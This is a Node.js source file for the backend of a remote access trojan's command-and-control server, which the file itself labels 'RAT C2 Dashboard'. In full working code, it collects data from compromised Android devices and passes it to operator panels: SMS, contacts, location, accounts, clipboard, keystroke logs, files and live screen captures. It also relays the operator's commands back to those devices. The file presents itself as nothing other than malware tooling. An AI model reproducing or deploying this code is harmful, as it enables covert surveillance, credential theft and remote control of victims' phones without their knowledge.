'use strict';

// ─────────────────────────────────────────────
//  RAT C2 Dashboard — Backend Server
//  Device APK  →  ws://HOST:PORT/ws
//  Dashboard   →  ws://HOST:PORT/panel
//  Frontend    →  http://HOST:PORT/
//  Health      →  http://HOST:PORT/health
//
//  Binary frame from APK:
//    [0x01][4-byte big-endian size][JPEG bytes]
//
//  Text from APK:  JSON { type, ... }
//  Commands to APK: JSON { action, ... }
// ─────────────────────────────────────────────

const express = require('express');
const http    = require('http');
const path    = require('path');
const { WebSocketServer, WebSocket } = require('ws');

const PORT         = parseInt(process.env.PORT || '5000', 10);
const HOST         = process.env.HOST || '0.0.0.0';
const PING_INTERVAL = parseInt(process.env.PING_INTERVAL || '25000', 10);  // ms
const PONG_TIMEOUT  = PING_INTERVAL * 3;                                    // 3 missed pings → dead

// ── Express ─────────────────────────────────
const app = express();
app.use(express.json({ limit: '50mb' }));
app.use(express.static(path.join(__dirname, 'public')));

// ── Health ───────────────────────────────────
app.get('/health', (_req, res) => {
  const devList = [...devices.values()];
  res.json({
    status:    'ok',
    uptime:    process.uptime(),
    memory:    process.memoryUsage(),
    devices: {
      total:  devList.length,
      online: devList.filter(d => d.online).length,
    },
    dashboards: dashboardClients.size,
    ts: Date.now(),
  });
});

// ── REST: device list (debug / tooling) ──────
app.get('/api/devices', (_req, res) => {
  res.json({ devices: [...devices.values()].map(publicDevice) });
});

// ── REST: send command (script / tooling fallback) ──
app.post('/api/command', (req, res) => {
  const { deviceId, payload } = req.body || {};
  if (!payload) return res.status(400).json({ ok: false, error: 'missing payload' });
  const ok = forwardToDevice(deviceId, payload);
  res.json({ ok });
});

// ── HTTP + WebSocket servers ─────────────────
const server = http.createServer(app);

// WebSocket endpoint for device APKs  →  /ws
const deviceWss = new WebSocketServer({ server, path: '/ws' });

// WebSocket endpoint for dashboard UI  →  /panel
const panelWss  = new WebSocketServer({ server, path: '/panel' });

// ── Device registry ──────────────────────────
// Map<deviceId, DeviceRecord>
const devices = new Map();

// ── Dashboard client registry ─────────────────
// Map<ws, ClientRecord>
const dashboardClients = new Map();

// ── Session counters ─────────────────────────
let totalCmds = 0;

// ─────────────────────────────────────────────
//  Helpers
// ─────────────────────────────────────────────

/** Strip heavy cached buffers; return only what the panel needs */
function publicDevice(dev) {
  return {
    id:          dev.id,
    online:      dev.online,
    connectedAt: dev.connectedAt,
    info:        dev.info || null,
  };
}

/** Send JSON safely to a WebSocket. Returns true on success. */
function wsSend(ws, obj) {
  if (!ws || ws.readyState !== WebSocket.OPEN) return false;
  try {
    ws.send(JSON.stringify(obj));
    return true;
  } catch {
    return false;
  }
}

/** Broadcast JSON to all connected dashboard clients. */
function broadcastAll(obj) {
  const payload = JSON.stringify(obj);
  for (const [ws] of dashboardClients) {
    if (ws.readyState === WebSocket.OPEN) {
      try { ws.send(payload); } catch { /* ignore closed */ }
    }
  }
}

/** Broadcast JSON to dashboard clients currently watching a specific device. */
function broadcastToWatchers(deviceId, obj) {
  const payload = JSON.stringify(obj);
  for (const [ws, client] of dashboardClients) {
    if (client.subscribedDeviceId === deviceId && ws.readyState === WebSocket.OPEN) {
      try { ws.send(payload); } catch {}
    }
  }
}

/**
 * Forward raw binary Buffer to watchers of a device.
 * Zero-copy: no re-encoding, no base64.
 */
function broadcastBinaryToWatchers(deviceId, buf) {
  for (const [ws, client] of dashboardClients) {
    if (client.subscribedDeviceId === deviceId && ws.readyState === WebSocket.OPEN) {
      try { ws.send(buf); } catch {}
    }
  }
}

/** Send a JSON command to a device. Returns true on success. */
function forwardToDevice(deviceId, payload) {
  if (!deviceId) return false;
  const dev = devices.get(deviceId);
  if (!dev || !dev.online || !dev.ws || dev.ws.readyState !== WebSocket.OPEN) return false;
  try {
    dev.ws.send(JSON.stringify(payload));
    totalCmds++;
    return true;
  } catch {
    return false;
  }
}

// ─────────────────────────────────────────────
//  Device message handler
// ─────────────────────────────────────────────
function handleDeviceMessage(ws, raw) {
  let msg;
  try { msg = JSON.parse(raw); } catch { return; }
  if (!msg || typeof msg !== 'object') return;

  const msgType = ((msg.type || msg.action || '')).toUpperCase();

  // ── Registration ─────────────────────────
  if (msgType === 'DEVICE_INFO' || msgType === 'REGISTER') {
    const id = msg.device_id || msg.deviceId || ws.remoteAddr;
    ws._deviceId = id;

    let dev = devices.get(id);
    if (!dev) {
      dev = {
        id,
        ws,
        online:      true,
        connectedAt: Date.now(),
        info:        msg,
        lastFrame:   null,
        sms:         [],
        contacts:    [],
        apps:        [],
        accounts:    [],
        location:    null,
        keylogs:     [],
        files:       [],
        clipboard:   null,
        stealth:     null,
      };
      devices.set(id, dev);
    } else {
      dev.ws      = ws;
      dev.online  = true;
      dev.info    = { ...dev.info, ...msg };
    }

    broadcastAll({ type: 'DEVICE_CONNECTED', device: publicDevice(dev) });
    broadcastToWatchers(id, { type: 'DEVICE_INFO', data: dev.info });
    return;
  }

  // ── All other messages: resolve deviceId ──
  const deviceId = ws._deviceId;
  if (!deviceId) return;

  const dev = devices.get(deviceId);
  if (!dev) return;

  // ── Persist incoming data ─────────────────
  switch (msgType) {
    case 'SMS':
    case 'SMS_LIST':
      dev.sms = Array.isArray(msg.data) ? msg.data
              : Array.isArray(msg.messages) ? msg.messages
              : Array.isArray(msg.sms) ? msg.sms
              : dev.sms;
      break;

    case 'CONTACTS':
    case 'CONTACT_LIST':
    case 'CONTACTS_LIST':
      dev.contacts = Array.isArray(msg.data) ? msg.data
                   : Array.isArray(msg.contacts) ? msg.contacts
                   : dev.contacts;
      break;

    case 'LOCATION':
    case 'GPS_LOCATION':
      dev.location = msg;
      break;

    case 'INSTALLED_APPS':
    case 'APP_LIST':
    case 'APPS':
      dev.apps = Array.isArray(msg.data) ? msg.data
               : Array.isArray(msg.apps) ? msg.apps
               : dev.apps;
      break;

    case 'ACCOUNTS':
    case 'GOOGLE_ACCOUNTS':
      dev.accounts = Array.isArray(msg.data) ? msg.data
                   : Array.isArray(msg.accounts) ? msg.accounts
                   : dev.accounts;
      break;

    case 'CLIPBOARD':
    case 'CLIPBOARD_DATA':
      dev.clipboard = msg.data || msg.text || msg.clipboard || null;
      break;

    case 'KEYLOG':
    case 'KEYLOGGER_DATA':
    case 'KEYLOG_DATA': {
      const entry = { ts: Date.now(), data: msg.data || msg.text || msg };
      dev.keylogs.unshift(entry);
      if (dev.keylogs.length > 1000) dev.keylogs.length = 1000;
      break;
    }

    case 'FILE_LIST':
    case 'FILES':
      dev.files = Array.isArray(msg.data) ? msg.data
                : Array.isArray(msg.files) ? msg.files
                : dev.files;
      break;

    case 'STEALTH_STATUS':
      dev.stealth = msg;
      break;

    default: break;
  }

  // Forward everything to watching dashboards
  broadcastToWatchers(deviceId, msg);
}

// ─────────────────────────────────────────────
//  Device WebSocket server
// ─────────────────────────────────────────────
deviceWss.on('connection', (ws, req) => {
  const remoteAddr = req.socket.remoteAddress || 'unknown';
  ws.remoteAddr    = remoteAddr;
  ws.isAlive       = true;

  console.log(`[+] Device connected: ${remoteAddr}`);

  ws.on('pong', () => {
    ws.isAlive = true;
  });

  ws.on('message', (data, isBinary) => {
    if (isBinary) {
      // Binary screen frame: [0x01][4-byte big-endian len][JPEG]
      if (data.length >= 5 && data[0] === 0x01) {
        const deviceId = ws._deviceId;
        if (deviceId) {
          const dev = devices.get(deviceId);
          if (dev) dev.lastFrame = data;           // cache latest frame
          broadcastBinaryToWatchers(deviceId, data); // zero-copy forward
        }
      }
    } else {
      handleDeviceMessage(ws, data.toString());
    }
  });

  ws.on('close', (code, reason) => {
    const deviceId = ws._deviceId;
    if (deviceId) {
      const dev = devices.get(deviceId);
      if (dev) {
        dev.online    = false;
        dev.ws        = null;
        dev.lastFrame = null; // clear stale frame
        console.log(`[-] Device offline: ${deviceId} (${code})`);
        broadcastAll({ type: 'DEVICE_OFFLINE', deviceId });
      }
    }
  });

  ws.on('error', (err) => {
    // Log but do not crash - ws 'close' fires after 'error'
    console.error(`[!] Device WS error (${ws._deviceId || remoteAddr}): ${err.message}`);
  });
});

// ─────────────────────────────────────────────
//  Dashboard WebSocket server
// ─────────────────────────────────────────────
panelWss.on('connection', (ws) => {
  ws.isAlive = true;
  dashboardClients.set(ws, { subscribedDeviceId: null });
  console.log(`[+] Panel client connected (${dashboardClients.size} total)`);

  // Immediately push full device list
  wsSend(ws, {
    type:    'DEVICE_LIST',
    devices: [...devices.values()].map(publicDevice),
  });

  ws.on('pong', () => { ws.isAlive = true; });

  ws.on('message', (data) => {
    let msg;
    try { msg = JSON.parse(data.toString()); } catch { return; }
    if (!msg || typeof msg !== 'object') return;

    const client = dashboardClients.get(ws);
    if (!client) return;

    const action = (msg.action || '').toUpperCase();

    switch (action) {

      // ── Subscribe to a device ──────────────
      case 'SELECT_DEVICE': {
        const deviceId = msg.deviceId;
        client.subscribedDeviceId = deviceId;
        const dev = devices.get(deviceId);
        if (!dev) {
          wsSend(ws, { type: 'ERROR', error: 'device_not_found', deviceId });
          break;
        }
        // Immediately replay last screen frame so canvas isn't blank
        if (dev.lastFrame) {
          try { ws.send(dev.lastFrame); } catch {}
        }
        // Push all cached state in one shot
        wsSend(ws, {
          type: 'DEVICE_STATE',
          data: {
            info:      dev.info,
            sms:       dev.sms,
            contacts:  dev.contacts,
            location:  dev.location,
            apps:      dev.apps,
            keylogs:   dev.keylogs.slice(0, 200),
            accounts:  dev.accounts,
            files:     dev.files,
            clipboard: dev.clipboard,
            stealth:   dev.stealth,
          },
        });
        break;
      }

      // ── Unsubscribe ────────────────────────
      case 'UNSELECT_DEVICE':
        client.subscribedDeviceId = null;
        break;

      // ── Send command to device ─────────────
      case 'COMMAND': {
        const targetId = msg.deviceId || client.subscribedDeviceId;
        if (!targetId) {
          wsSend(ws, { type: 'COMMAND_ACK', ok: false, error: 'no_device_selected', payload: msg.payload });
          break;
        }
        const ok = forwardToDevice(targetId, msg.payload);
        wsSend(ws, { type: 'COMMAND_ACK', ok, payload: msg.payload });
        if (!ok) {
          const dev = devices.get(targetId);
          const reason = !dev ? 'device_not_found' : !dev.online ? 'device_offline' : 'send_failed';
          wsSend(ws, { type: 'COMMAND_ACK', ok: false, error: reason, payload: msg.payload });
        }
        break;
      }

      // ── Refresh device list ────────────────
      case 'GET_DEVICES':
        wsSend(ws, {
          type:    'DEVICE_LIST',
          devices: [...devices.values()].map(publicDevice),
        });
        break;

      // ── Request cached state ───────────────
      case 'GET_STATE': {
        const deviceId = msg.deviceId || client.subscribedDeviceId;
        const dev = devices.get(deviceId);
        if (!dev) break;
        wsSend(ws, {
          type: 'DEVICE_STATE',
          data: {
            info:      dev.info,
            sms:       dev.sms,
            contacts:  dev.contacts,
            location:  dev.location,
            apps:      dev.apps,
            keylogs:   dev.keylogs.slice(0, 200),
            accounts:  dev.accounts,
            files:     dev.files,
            clipboard: dev.clipboard,
            stealth:   dev.stealth,
          },
        });
        break;
      }

      default: break;
    }
  });

  ws.on('close', () => {
    dashboardClients.delete(ws);
    console.log(`[-] Panel client disconnected (${dashboardClients.size} remaining)`);
  });

  ws.on('error', (err) => {
    console.error(`[!] Panel WS error: ${err.message}`);
  });
});

// ─────────────────────────────────────────────
//  Heartbeat — detect dead connections
//  Uses the standard ws `isAlive` pattern.
//  Any socket that does not respond to a ping
//  within PING_INTERVAL ms is terminated.
// ─────────────────────────────────────────────
const heartbeatTimer = setInterval(() => {
  // Device connections
  for (const [, dev] of devices) {
    const ws = dev.ws;
    if (!ws || ws.readyState !== WebSocket.OPEN) continue;
    if (ws.isAlive === false) {
      console.warn(`[~] Terminating dead device connection: ${dev.id}`);
      ws.terminate();
      continue;
    }
    ws.isAlive = false;
    try { ws.ping(); } catch {}
  }

  // Dashboard connections
  for (const [ws] of dashboardClients) {
    if (ws.readyState !== WebSocket.OPEN) continue;
    if (ws.isAlive === false) {
      ws.terminate();
      continue;
    }
    ws.isAlive = false;
    try { ws.ping(); } catch {}
  }
}, PING_INTERVAL);

// Clean up timer if server closes
server.on('close', () => clearInterval(heartbeatTimer));

// ─────────────────────────────────────────────
//  Graceful shutdown
// ─────────────────────────────────────────────
function shutdown(signal) {
  console.log(`\n[*] ${signal} received — shutting down…`);
  clearInterval(heartbeatTimer);
  server.close(() => {
    console.log('[*] Server closed');
    process.exit(0);
  });
  // Force-exit after 5s if connections linger
  setTimeout(() => process.exit(1), 5000);
}

process.on('SIGINT',  () => shutdown('SIGINT'));
process.on('SIGTERM', () => shutdown('SIGTERM'));

process.on('uncaughtException', (err) => {
  console.error('[!] Uncaught exception:', err);
  // Do not exit — keep server running
});

process.on('unhandledRejection', (reason) => {
  console.error('[!] Unhandled rejection:', reason);
});

// ─────────────────────────────────────────────
//  Start
// ─────────────────────────────────────────────
server.listen(PORT, HOST, () => {
  console.log('');
  console.log('  ╔═══════════════════════════╗');
  console.log('  ║    RAT C2 Dashboard       ║');
  console.log('  ╚═══════════════════════════╝');
  console.log('');
  console.log(`  Dashboard : http://${HOST}:${PORT}`);
  console.log(`  Health    : http://${HOST}:${PORT}/health`);
  console.log(`  Device WS : ws://${HOST}:${PORT}/ws`);
  console.log(`  Panel WS  : ws://${HOST}:${PORT}/panel`);
  console.log(`  Heartbeat : every ${PING_INTERVAL / 1000}s`);
  console.log('');
});
